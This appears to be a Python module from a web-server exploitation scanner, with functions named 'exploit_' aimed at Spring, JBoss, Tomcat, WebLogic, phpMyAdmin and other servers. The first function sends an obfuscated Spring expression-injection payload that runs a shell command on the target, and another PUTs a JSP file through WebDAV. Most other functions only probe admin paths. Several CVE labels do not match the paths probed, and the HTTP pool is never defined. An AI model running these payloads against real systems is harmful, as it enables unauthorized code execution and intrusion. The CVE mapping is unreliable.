from urllib.parse import quote

from src.utils.http_helpers import get_successfully
from src.utils.misc import get_random_user_agent


def exploit_spring_web_flow(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent(),
               "Content-Type": "application/x-www-form-urlencoded"}
    payload = "_eventId=submit&execution=e1s1&flowExecutionKey=e1s1&spring_webflow_bogus=1&code="
    payload += quote(
        "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99)+T(java.lang.Character).toString(109)+T(java.lang.Character).toString(100)+T(java.lang.Character).toString(32)+T(java.lang.Character).toString(47)+T(java.lang.Character).toString(98)+T(java.lang.Character).toString(105)+T(java.lang.Character).toString(110)+T(java.lang.Character).toString(47)+T(java.lang.Character).toString(98)+T(java.lang.Character).toString(97)+T(java.lang.Character).toString(115)+T(java.lang.Character).toString(104)+T(java.lang.Character).toString(32)+T(java.lang.Character).toString(45)+T(java.lang.Character).toString(99)+T(java.lang.Character).toString(32)+T(java.lang.Character).toString(105)+T(java.lang.Character).toString(100)).getInputStream(),response.getOutputStream())")
    gl_http_pool.request('POST', url, headers=headers, body=payload)
    return None


def exploit_jboss_web_console(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/web-console/Invoker"
    gl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/web-console/Invoker")


def exploit_jboss_admin_console(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/admin-console/login.seam"
    gl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/admin-console/login.seam")


def exploit_webdav_put(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/webdav/jexshell.jsp"
    body = b"<% out.println(\"JEXBOSS\"); %>"
    gl_http_pool.request('PUT', url + payload, redirect=False, headers=headers, body=body)
    return get_successfully(url, "/webdav/jexshell.jsp")


def exploit_tomcat_manager(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/manager/html"
    gl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/manager/html")


def exploit_axis2_deploy(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/axis2/axis2-admin/upload"
    gl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/axis2/axis2-admin/upload")


def exploit_glassfish_console(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/common/applications/upload.jsf"
    gl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/common/applications/upload.jsf")


def exploit_weblogic_console(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/console/login/LoginForm.jsp"
    gl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/console/login/LoginForm.jsp")


def exploit_rails_public(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/public/dispatch.fcgi"
    gl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/public/dispatch.fcgi")


def exploit_phpmyadmin_setup(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/phpmyadmin/setup/index.php"
    gl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/phpmyadmin/setup/index.php")


def exploit_coldfusion_admin(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/CFIDE/administrator/index.cfm"
    gl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/CFIDE/administrator/index.cfm")


def exploit_drupal_services(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/services/xmlrpc"
    gl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/services/xmlrpc")


def exploit_spring_mvc(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/spring-mvc/show"
    gl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/spring-mvc/show")


def exploit_cve_2010_0738(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/servlet/InvokerServlet"
    gl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/servlet/InvokerServlet")


def exploit_cve_2012_2937(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/console/portal.war"
    gl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/console/portal.war")


def exploit_cve_2017_7529(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/api/v1/nexus"
    gl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/api/v1/nexus")


def exploit_cve_2020_2551(url):
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    payload = "/wls-wsat/CoordinatorPortType"
    gl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/wls-wsat/CoordinatorPortType")
